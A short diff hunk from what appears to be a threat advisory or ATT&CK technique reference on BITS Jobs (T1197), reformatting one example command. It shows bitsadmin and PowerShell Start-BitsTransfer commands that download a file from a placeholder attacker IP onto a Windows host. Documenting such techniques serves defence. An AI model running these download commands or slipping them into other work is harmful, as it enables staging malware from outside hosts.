@@ -352,7 +352,7 @@ BITS Jobs [[T1197](https://attack.mitre.org/techniques/T1197/)]
 
 ```
 cmd.exe /c bitsadmin /transfer n http[:]//<IP_address>:<port>/<file_name>.ext $public\Downloads\<output_file>.ext
-PowerShell "Start-BitsTransfer -Source http[:]//<IP_address>/pathto/<file_name>.ext -Destination C:\\Users\\pathtofile\\<output_file>.ext -transfertype download"
+powershell.exe Start-BitsTransfer -Source http[:]//<IP_address>/pathto/<file_name>.ext -Destination C:\\Users\\pathtofile\\<output_file>.ext -transfertype download
 ```
 <br>
 
